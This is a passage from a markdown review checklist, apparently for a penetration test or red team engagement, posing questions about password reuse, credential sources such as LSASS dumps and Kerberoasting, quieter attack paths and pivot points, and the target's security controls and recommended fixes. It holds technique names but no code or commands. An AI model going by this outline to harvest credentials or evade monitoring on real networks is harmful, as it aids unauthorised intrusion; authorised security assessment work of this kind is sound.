- Are there patterns in password reuse?
    - Common password formats
    - Seasonal patterns (Summer2024, Winter2024)
    - Service account naming conventions
- Which credential sources were most valuable?
    - LSASS dumps
    - Configuration files
    - SSH key harvesting
    - Kerberoasting/AS-REP roasting

### 🗺️ Path Optimization

- Are there more efficient paths to high-value targets?
    - Shorter attack chains
    - Less noisy methods
    - More reliable techniques
- Which systems provide the best pivot points?
    - Jump servers
    - Management systems
    - Dual-homed hosts
- Where are the bottlenecks?
    - Network segmentation
    - Account restrictions
    - Monitoring systems

### 🛡️ Security Posture Assessment

- What security controls were encountered?
    - EDR/AV detection rates
    - Network segmentation effectiveness
    - Account restrictions (LAPS, MFA)
    - Monitoring and alerting
- What weaknesses were exploited?
    - Password reuse
    - Over-privileged accounts
    - Missing patches
    - Weak configurations
- What recommendations should be documented?
    - Immediate fixes
    - Long-term improvements
    - Detection opportunities
